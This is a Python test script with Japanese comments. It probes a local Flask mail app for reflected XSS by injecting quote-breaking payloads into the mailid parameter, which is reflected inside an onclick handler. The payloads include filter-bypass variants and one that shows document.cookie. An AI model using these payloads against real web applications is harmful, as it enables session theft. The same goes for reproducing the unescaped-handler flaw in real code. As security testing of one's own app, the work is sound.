#!/usr/bin/env python3
"""
メール詳細ページのXSS脆弱性テスト
mailid パラメーターがイベントハンドラー内に反射されるXSS攻撃のテスト
"""

import requests
import urllib.parse

# テスト用URL
BASE_URL = "http://localhost:5000"
LOGIN_URL = f"{BASE_URL}/login"
MAIL_READ_URL = f"{BASE_URL}/mail/read"

def test_mail_xss():
    """メール詳細ページのXSSテスト"""
    
    # セッション開始
    session = requests.Session()
    
    print("=== メール詳細ページ XSS攻撃テスト ===\n")
    
    # 1. 基本的なXSSペイロード（サニタイズされる）
    print("1. サニタイズされるペイロード:")
    basic_payload = "1';alert('XSS');//"
    encoded_payload = urllib.parse.quote(basic_payload)
    
    print(f"   元のペイロード: {basic_payload}")
    print(f"   URLエンコード: {encoded_payload}")
    
    # リクエストを送信
    response = session.get(f"{MAIL_READ_URL}?mailid={encoded_payload}")
    print(f"   ステータス: {response.status_code}")
    
    if "alert" in response.text:
        print("   🚨 XSS成功: alertが実行されます")
    elif "&lt;" in response.text or "&gt;" in response.text:
        print("   ✅ サニタイズ検出: 危険な文字がエスケープされました")
    else:
        print("   📝 レスポンス確認が必要")
    
    print()
    
    # 2. エスケープ回避の試み
    print("2. エスケープ回避の試み:")
    advanced_payloads = [
        "1');alert(String.fromCharCode(88,83,83));//",
        "1');alert(/XSS/);//",
        "1');eval('alert(1)');//",
        "1');window['alert'](1);//",
        "1');(function(){alert(1)})();//"
    ]
    
    for i, payload in enumerate(advanced_payloads, 1):
        encoded = urllib.parse.quote(payload)
        print(f"   テスト {i}: {payload}")
        
        response = session.get(f"{MAIL_READ_URL}?mailid={encoded}")
        if "alert" in response.text or "eval" in response.text:
            print(f"   🚨 潜在的XSS検出")
        else:
            print(f"   ✅ ブロック済み")
    
    print()
    
    # 3. 実際のブラウザ確認用URL
    print("3. ブラウザでの確認用URL:")
    test_payloads = [
        "1';alert('基本XSS');//",
        "1');alert(document.cookie);//",
        "1');alert('メールXSS成功');//"
    ]
    
    for payload in test_payloads:
        encoded = urllib.parse.quote(payload)
        test_url = f"{MAIL_READ_URL}?mailid={encoded}"
        print(f"   {test_url}")
    
    print()
    
    # 4. 攻撃シナリオの説明
    print("4. 攻撃シナリオの解説:")
    print("   📧 ターゲット: /mail/read?mailid=<XSS_PAYLOAD>")
    print("   🎯 反射ポイント: onclick=\"handleMailAction('{{ mailid }}')\"")
    print("   🔧 攻撃手法: JavaScriptイベントハンドラー内のXSS")
    print("   🛡️ 防御状況: >< をサニタイズ、しかし ' は通る可能性")
    print("   💡 攻撃例: mailid=1');alert('XSS');//")
    print("   🎯 結果: onclick=\"handleMailAction('1');alert('XSS');//')\" として実行")
    
    print("\n=== テスト完了 ===")

if __name__ == "__main__":
    try:
        test_mail_xss()
    except requests.exceptions.ConnectionError:
        print("❌ サーバーに接続できません。Flask アプリケーションが起動していることを確認してください。")
    except Exception as e:
        print(f"❌ エラーが発生しました: {str(e)}")